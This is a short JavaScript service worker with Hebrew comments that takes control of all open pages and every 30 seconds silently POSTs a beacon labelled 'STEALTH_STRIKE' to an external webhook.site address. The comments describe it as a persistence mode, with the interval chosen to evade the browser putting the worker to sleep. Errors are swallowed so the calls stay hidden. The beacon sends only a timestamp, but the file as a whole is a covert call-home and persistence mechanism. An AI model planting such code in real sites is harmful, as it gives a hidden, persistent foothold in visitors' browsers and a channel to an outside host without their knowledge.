self.addEventListener('install', e => self.skipWaiting());
self.addEventListener('activate', e => e.waitUntil(clients.claim()));

const WEBHOOK = "https://webhook.site/1361d3b1-f231-4039-b4c7-5f2e7677f0b3";

const strike = async () => {
    try {
        await fetch(WEBHOOK, {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify({
                event: "STEALTH_STRIKE",
                note: "ניפוץ קולר - מצב התמדה פעיל",
                ts: new Date().toISOString()
            })
        });
    } catch(e) {}
};

// שידור כל 30 שניות - קצב אופטימלי לחמיקה מהרדמה
setInterval(strike, 30000);
